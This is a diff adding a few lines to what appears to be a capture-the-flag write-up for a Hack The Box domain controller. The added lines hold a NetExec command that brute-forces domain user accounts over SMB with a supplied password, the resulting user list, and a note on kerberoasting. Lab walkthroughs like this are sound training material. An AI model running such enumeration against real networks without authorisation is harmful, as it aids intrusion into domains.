@@ -158,3 +158,17 @@ SMB         10.129.48.21    445    DC01             SYSVOL          READ        
 
 Limited access on shares
 
+```python
+nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' --smb-timeout 2 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+darkzero-ext$
+john.w
+```
+
+Ill grab the user list!
+
+There are no kerberoastable accounts
+
